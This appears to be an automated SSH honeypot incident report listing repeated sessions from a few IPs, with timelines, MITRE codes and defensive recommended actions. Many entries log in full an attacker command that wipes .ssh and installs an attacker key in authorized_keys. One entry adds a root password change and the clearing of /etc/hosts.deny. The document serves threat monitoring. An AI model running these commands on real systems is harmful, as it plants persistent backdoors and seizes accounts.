| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 18:16:25` | `cowrie.session.connect` |
| `2026-06-11 18:16:25` | `cowrie.client.version` |
| `2026-06-11 18:16:25` | `cowrie.client.kex` |
| `2026-06-11 18:16:26` | `cowrie.login.success` |
| `2026-06-11 18:16:26` | `cowrie.session.params` |
| `2026-06-11 18:16:26` | `cowrie.command.input` |
| `2026-06-11 18:16:26` | `cowrie.command.failed` |
| `2026-06-11 18:16:27` | `cowrie.log.closed` |
| `2026-06-11 18:16:27` | `cowrie.session.params` |
| `2026-06-11 18:16:27` | `cowrie.command.input` |
| `2026-06-11 18:16:27` | `cowrie.session.file_download` |
| `2026-06-11 18:16:27` | `cowrie.log.closed` |
| `2026-06-11 18:16:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.211[.]57` to AbuseIPDB if not already reported
- [ ] Block `115.190.211[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-986cfa7d5128

| Field | Detail |
|---|---|
| **Source IP** | `115.190.211[.]57` |
| **First Seen** | 2026-06-11 18:16 |
| **Last Seen** | 2026-06-11 18:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 18:16:35` | `cowrie.session.connect` |
| `2026-06-11 18:16:36` | `cowrie.client.version` |
| `2026-06-11 18:16:36` | `cowrie.client.kex` |
| `2026-06-11 18:16:37` | `cowrie.login.success` |
| `2026-06-11 18:16:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.211[.]57` to AbuseIPDB if not already reported
- [ ] Block `115.190.211[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbb3492f6fb1

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 18:35 |
| **Last Seen** | 2026-06-11 18:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 18:35:30` | `cowrie.session.connect` |
| `2026-06-11 18:35:30` | `cowrie.client.version` |
| `2026-06-11 18:35:30` | `cowrie.client.kex` |
| `2026-06-11 18:35:31` | `cowrie.login.success` |
| `2026-06-11 18:35:32` | `cowrie.session.params` |
| `2026-06-11 18:35:32` | `cowrie.command.input` |
| `2026-06-11 18:35:32` | `cowrie.command.failed` |
| `2026-06-11 18:35:33` | `cowrie.log.closed` |
| `2026-06-11 18:35:33` | `cowrie.session.params` |
| `2026-06-11 18:35:33` | `cowrie.command.input` |
| `2026-06-11 18:35:33` | `cowrie.session.file_download` |
| `2026-06-11 18:35:33` | `cowrie.log.closed` |
| `2026-06-11 18:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-683b44acd0de

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 18:35 |
| **Last Seen** | 2026-06-11 18:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 18:35:36` | `cowrie.session.connect` |
| `2026-06-11 18:35:36` | `cowrie.client.version` |
| `2026-06-11 18:35:36` | `cowrie.client.kex` |
| `2026-06-11 18:35:37` | `cowrie.login.success` |
| `2026-06-11 18:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc083691e781

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 18:43 |
| **Last Seen** | 2026-06-11 18:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 18:43:01` | `cowrie.session.connect` |
| `2026-06-11 18:43:01` | `cowrie.client.version` |
| `2026-06-11 18:43:01` | `cowrie.client.kex` |
| `2026-06-11 18:43:02` | `cowrie.login.success` |
| `2026-06-11 18:43:03` | `cowrie.session.params` |
| `2026-06-11 18:43:03` | `cowrie.command.input` |
| `2026-06-11 18:43:03` | `cowrie.command.failed` |
| `2026-06-11 18:43:03` | `cowrie.log.closed` |
| `2026-06-11 18:43:03` | `cowrie.session.params` |
| `2026-06-11 18:43:03` | `cowrie.command.input` |
| `2026-06-11 18:43:04` | `cowrie.session.file_download` |
| `2026-06-11 18:43:04` | `cowrie.log.closed` |
| `2026-06-11 18:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91d2b4ce9456

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 18:43 |
| **Last Seen** | 2026-06-11 18:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 18:43:07` | `cowrie.session.connect` |
| `2026-06-11 18:43:07` | `cowrie.client.version` |
| `2026-06-11 18:43:07` | `cowrie.client.kex` |
| `2026-06-11 18:43:08` | `cowrie.login.success` |
| `2026-06-11 18:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62dc1cb528ef

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 18:44 |
| **Last Seen** | 2026-06-11 18:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 18:44:59` | `cowrie.session.connect` |
| `2026-06-11 18:44:59` | `cowrie.client.version` |
| `2026-06-11 18:45:00` | `cowrie.client.kex` |
| `2026-06-11 18:45:01` | `cowrie.login.success` |
| `2026-06-11 18:45:01` | `cowrie.session.params` |
| `2026-06-11 18:45:01` | `cowrie.command.input` |
| `2026-06-11 18:45:01` | `cowrie.command.failed` |
| `2026-06-11 18:45:02` | `cowrie.log.closed` |
| `2026-06-11 18:45:02` | `cowrie.session.params` |
| `2026-06-11 18:45:02` | `cowrie.command.input` |
| `2026-06-11 18:45:02` | `cowrie.session.file_download` |
| `2026-06-11 18:45:02` | `cowrie.log.closed` |
| `2026-06-11 18:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ea7434ecce0

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 18:45 |
| **Last Seen** | 2026-06-11 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 18:45:05` | `cowrie.session.connect` |
| `2026-06-11 18:45:05` | `cowrie.client.version` |
| `2026-06-11 18:45:06` | `cowrie.client.kex` |
| `2026-06-11 18:45:07` | `cowrie.login.success` |
| `2026-06-11 18:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59ee08b7f4a7

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 18:47 |
| **Last Seen** | 2026-06-11 18:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 18:47:05` | `cowrie.session.connect` |
| `2026-06-11 18:47:05` | `cowrie.client.version` |
| `2026-06-11 18:47:05` | `cowrie.client.kex` |
| `2026-06-11 18:47:06` | `cowrie.login.success` |
| `2026-06-11 18:47:06` | `cowrie.session.params` |
| `2026-06-11 18:47:06` | `cowrie.command.input` |
| `2026-06-11 18:47:06` | `cowrie.command.failed` |
| `2026-06-11 18:47:07` | `cowrie.log.closed` |
| `2026-06-11 18:47:07` | `cowrie.session.params` |
| `2026-06-11 18:47:07` | `cowrie.command.input` |
| `2026-06-11 18:47:07` | `cowrie.session.file_download` |
| `2026-06-11 18:47:07` | `cowrie.log.closed` |
| `2026-06-11 18:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40ea1479efcb

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 18:47 |
| **Last Seen** | 2026-06-11 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 18:47:10` | `cowrie.session.connect` |
| `2026-06-11 18:47:10` | `cowrie.client.version` |
| `2026-06-11 18:47:11` | `cowrie.client.kex` |
| `2026-06-11 18:47:12` | `cowrie.login.success` |
| `2026-06-11 18:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d236c94e90e3

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 18:56 |
| **Last Seen** | 2026-06-11 18:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 18:56:47` | `cowrie.session.connect` |
| `2026-06-11 18:56:47` | `cowrie.client.version` |
| `2026-06-11 18:56:47` | `cowrie.client.kex` |
| `2026-06-11 18:56:48` | `cowrie.login.success` |
| `2026-06-11 18:56:49` | `cowrie.session.params` |
| `2026-06-11 18:56:49` | `cowrie.command.input` |
| `2026-06-11 18:56:49` | `cowrie.command.failed` |
| `2026-06-11 18:56:49` | `cowrie.log.closed` |
| `2026-06-11 18:56:50` | `cowrie.session.params` |
| `2026-06-11 18:56:50` | `cowrie.command.input` |
| `2026-06-11 18:56:50` | `cowrie.session.file_download` |
| `2026-06-11 18:56:50` | `cowrie.log.closed` |
| `2026-06-11 18:56:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ade39459ea0b

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 18:56 |
| **Last Seen** | 2026-06-11 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 18:56:53` | `cowrie.session.connect` |
| `2026-06-11 18:56:53` | `cowrie.client.version` |
| `2026-06-11 18:56:53` | `cowrie.client.kex` |
| `2026-06-11 18:56:54` | `cowrie.login.success` |
| `2026-06-11 18:56:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a875da21b546

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 19:00 |
| **Last Seen** | 2026-06-11 19:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:00:57` | `cowrie.session.connect` |
| `2026-06-11 19:00:57` | `cowrie.client.version` |
| `2026-06-11 19:00:57` | `cowrie.client.kex` |
| `2026-06-11 19:00:58` | `cowrie.login.success` |
| `2026-06-11 19:00:58` | `cowrie.session.params` |
| `2026-06-11 19:00:58` | `cowrie.command.input` |
| `2026-06-11 19:00:58` | `cowrie.command.failed` |
| `2026-06-11 19:00:59` | `cowrie.log.closed` |
| `2026-06-11 19:00:59` | `cowrie.session.params` |
| `2026-06-11 19:00:59` | `cowrie.command.input` |
| `2026-06-11 19:00:59` | `cowrie.session.file_download` |
| `2026-06-11 19:00:59` | `cowrie.log.closed` |
| `2026-06-11 19:01:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03142857dc4a

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 19:01 |
| **Last Seen** | 2026-06-11 19:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:01:02` | `cowrie.session.connect` |
| `2026-06-11 19:01:02` | `cowrie.client.version` |
| `2026-06-11 19:01:03` | `cowrie.client.kex` |
| `2026-06-11 19:01:04` | `cowrie.login.success` |
| `2026-06-11 19:01:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a54a9a1248ab

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 19:10 |
| **Last Seen** | 2026-06-11 19:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:10:43` | `cowrie.session.connect` |
| `2026-06-11 19:10:43` | `cowrie.client.version` |
| `2026-06-11 19:10:43` | `cowrie.client.kex` |
| `2026-06-11 19:10:44` | `cowrie.login.success` |
| `2026-06-11 19:10:45` | `cowrie.session.params` |
| `2026-06-11 19:10:45` | `cowrie.command.input` |
| `2026-06-11 19:10:45` | `cowrie.command.failed` |
| `2026-06-11 19:10:45` | `cowrie.log.closed` |
| `2026-06-11 19:10:46` | `cowrie.session.params` |
| `2026-06-11 19:10:46` | `cowrie.command.input` |
| `2026-06-11 19:10:46` | `cowrie.session.file_download` |
| `2026-06-11 19:10:46` | `cowrie.log.closed` |
| `2026-06-11 19:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a114fe2415c

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-06-11 19:10 |
| **Last Seen** | 2026-06-11 19:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:10:49` | `cowrie.session.connect` |
| `2026-06-11 19:10:49` | `cowrie.client.version` |
| `2026-06-11 19:10:49` | `cowrie.client.kex` |
| `2026-06-11 19:10:50` | `cowrie.login.success` |
| `2026-06-11 19:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e64bf40e838a

| Field | Detail |
|---|---|
| **Source IP** | `119.96.159[.]237` |
| **First Seen** | 2026-06-11 19:11 |
| **Last Seen** | 2026-06-11 19:11 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:A3sCcFYMAqg9"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
